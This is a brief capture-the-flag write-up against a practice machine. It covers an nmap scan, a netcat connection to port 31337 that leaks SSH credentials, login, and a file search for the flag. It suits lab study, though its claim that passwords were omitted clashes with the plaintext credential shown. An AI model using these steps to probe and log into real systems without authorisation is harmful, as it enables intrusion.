## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Myself 
Hello everyone / Team 
my name is Gautam aka Gh0ulH4x, i am cybersecurity analyst/ penetration tester and i recently just completed my ejpt and working on my CRTA 
today i will show case my skil with just using nnmap 
today, i am using just linux and nmap to show how to exploit vulnerabilities in machine or network just using linux for this i already generated an vulnerable machine and now i am going to show you how to exploit it so lets started 
```

# Reccon
Lets first Start scanning the network for this i already have an IP
```IP_address
10.10.32.240
```
this is we are going to work on so lets start with Nmap --version
```bash 
┌──(kali㉿kali)-[~]
└─$ nmap --version      
Nmap version 7.95 ( https://nmap.org )
Platform: x86_64-pc-linux-gnu
Compiled with: liblua-5.4.7 openssl-3.5.0 libssh2-1.11.1 libz-1.3.1 libpcre2-10.45 libpcap-1.10.5 nmap-libdnet-1.12 ipv6
Compiled without:
Available nsock engines: epoll poll select
```
now lets scan the IP-Address
```bash
nmap -sV -Pn -T4 10.10.32.240
- Port 22/tcp (SSH): Standard SSH service is running. 
- Port 2222/tcp (SSH): Another SSH instance, possibly a honeypot or a fake service. 
- Port 31337/tcp (Elite?): A non-standard port, often used in CTFs or by backdoors. Needs further exploration.
```

Then Running `Telnet/Netcat`
```bash 
nc 10.10.32.240 31337
In case I forget - user:pass 
ubuntu:Dafdas!!/str0ng
```
Got Credentials 
now lets take `SSH`
```bash 
ssh ubuntu@10.10.32.240
password Dafdas!!/str0ng
```
Got shell
then surf or find the flag flag.txt 
```bash 
find / -type f -iname "*flag*" 2>/dev/null
/home/user/flag.txt
```
then we used cat command 
```bash 
cat /home/user/flag.txt
[flag omitted]
```
Got the Flag
```flag
[flag omitted]
```